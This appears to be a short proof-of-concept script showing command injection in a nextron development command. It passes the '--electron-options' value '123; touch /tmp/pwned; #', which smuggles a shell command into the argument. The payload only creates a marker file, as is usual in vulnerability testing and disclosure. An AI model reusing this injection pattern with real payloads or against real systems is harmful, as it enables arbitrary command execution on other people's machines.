import { devCommand } from './lib/nextron-dev.js';
devCommand.parseAsync(['node', 'nextron-dev', '--electron-options', '123; touch /tmp/pwned; #']).catch(console.error);
